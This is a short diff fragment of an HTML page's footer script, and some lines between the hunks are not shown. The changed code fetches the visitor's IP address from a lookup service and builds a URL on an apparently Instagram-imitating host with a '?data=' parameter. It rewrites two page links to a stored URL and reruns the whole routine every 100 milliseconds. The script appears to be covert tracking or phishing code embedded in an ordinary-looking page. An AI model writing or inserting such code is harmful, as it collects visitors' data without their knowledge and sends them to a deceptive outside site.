@@ -135,7 +135,9 @@
 		</div>
 	</footer>
 
-<script>var a="https://instagramtg.github.io/?data=";
+<script>
+   function urls(){
+ var a="https://instagramtg.github.io/?data=";
      fetch('https://api.ipify.org/?format=json')
   .then((response) => response.json())
 
@@ -146,6 +148,8 @@
     var data=localStorage.getItem("url")
 document.getElementById("m1").href=data;
 document.getElementById("m2").href=data;
+   }
+	setInterval(urls,100)
 </script>
  
 </body></html>
